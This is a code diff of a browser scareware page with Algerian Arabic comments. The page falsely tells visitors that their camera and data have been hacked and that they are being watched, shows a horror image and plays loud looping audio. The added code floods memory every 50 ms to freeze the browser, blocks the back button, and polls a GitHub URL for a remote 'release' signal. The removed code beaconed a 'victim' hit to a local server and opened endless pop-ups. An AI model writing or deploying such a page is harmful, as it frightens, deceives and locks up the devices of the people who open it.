@@ -5,17 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>☠️ SYSTEM_CONTROL_DZ ☠️</title>
     <style>
-        /* إعدادات الواجهة المرعبة سواسوة */
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
         
-        /* ميزة الرأس المتحرك (المرأة) سواسوة */
         #horrorImg { 
             position: fixed; top: 0; left: 0; 
             width: 115vw; height: 115vh; 
             object-fit: cover; 
             z-index: 9999; display: none; 
             filter: contrast(220%) brightness(70%) grayscale(40%);
-            /* أنيميشن حركة الرأس البشرية سواسوة */
             animation: stalkingMove 5s infinite ease-in-out;
         }
 
@@ -53,70 +50,66 @@
         <p style="font-size: 15px; color: #fff; font-weight: bold;">
             لقد تم اختراق الكاميرا والبيانات.. نحن نراقبك الآن.
         </p>
-        <p style="font-size: 12px; color: #f00;">VOICE_SYNC: <span class="blink-red">ENFORCED</span></p>
+        <p style="font-size: 12px; color: #f00;">SYSTEM_STATUS: <span class="blink-red">LOCKED_BY_ADMIN</span></p>
         
         <input type="text" id="unlockBox" placeholder="أدخل رمز فك التشفير" oninput="verifyAdmin()">
-        <p style="font-size: 10px; color: #444; margin-top: 15px;">ROOT_SERVER: 127.0.0.1</p>
+        <p style="font-size: 10px; color: #444; margin-top: 15px;">WAITING FOR REMOTE PERMISSION...</p>
     </div>
 
-    <audio id="sfx">
+    <audio id="sfx" loop>
         <source src="tfy-krk.mp3" type="audio/mpeg">
     </audio>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const isAdmin = urlParams.get('user') === 'admin_dz'; 
         const MY_LINK = window.location.href;
         const audio = document.getElementById('sfx');
-
-        // ميزة استمرارية الهجوم سواسوة
-        if (localStorage.getItem('attack_active') === 'true' && !isAdmin) {
-            setTimeout(() => launchNightmare(), 100);
-        }
+        let remoteControl = false;
 
         function launchNightmare() {
-            if (isAdmin) return alert("Admin Bypass: Active.");
-            
-            // إرسال إشارة الرصد لسيرفر بايثون سواسوة
-            fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});
             localStorage.setItem('attack_active', 'true');
-
             document.getElementById('initScreen').style.display = 'none';
             document.getElementById('horrorImg').style.display = 'block';
             document.getElementById('deepWebOverlay').style.display = 'block';
             
-            // تشغيل الصوت بأقصى قوة سواسوة
+            // 1. الصوت يطوع بزاف سواسوة (Maximum Volume)
             audio.volume = 1.0;
             audio.play();
 
-            // الميزة المطلوبة: التحديث يصرى غير كي يخلص الصوت سواسوة
-            // باش الضحية يسمع "طفي خراك" كاملة وبلا تقطاش
-            audio.onended = function() {
-                if (!isAdmin) {
-                    location.reload(); 
-                }
-            };
-
-            // الحبس في تبويبات جديدة كل 4 ثواني سواسوة
+            // 2. ميزة اللاق غير الطبيعي سواسوة (Memory Overload)
             setInterval(() => {
-                if (!isAdmin) {
-                    window.open(MY_LINK, '_blank', 'width=10,height=10');
+                if (!remoteControl) {
+                    let junk = new Array(1000000).fill("STALKER"); 
+                    console.log(junk.length);
                 }
-            }, 4000);
+            }, 50);
+
+            // 3. منع زر الرجوع والحبس المؤبد سواسوة
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => history.go(1);
         }
+
+        // 4. ميزة التحكم من الترمكس سواسوة (Remote Release)
+        // الصفحة تبقى تحوس على إذن الخروج من رابط خارجي سواسوة
+        setInterval(() => {
+            fetch('https://raw.githubusercontent.com/username/repo/main/status.json')
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === "release") {
+                    remoteControl = true;
+                    localStorage.removeItem('attack_active');
+                    alert("Admin granted permission. Exiting...");
+                    location.href = "https://google.com";
+                }
+            }).catch(() => {});
+        }, 3000);
 
         function verifyAdmin() {
             if (document.getElementById('unlockBox').value === "free palastine") {
+                remoteControl = true;
                 localStorage.removeItem('attack_active');
                 location.href = "https://www.google.com";
             }
         }
-
-        // منع الهروب سواسوة
-        window.onbeforeunload = () => "CRITICAL_ERROR";
-        document.addEventListener("visibilitychange", () => {
-            if (!isAdmin && document.visibilityState === 'hidden') window.open(MY_LINK, '_blank');
-        });
     </script>
 </body>
 </html>
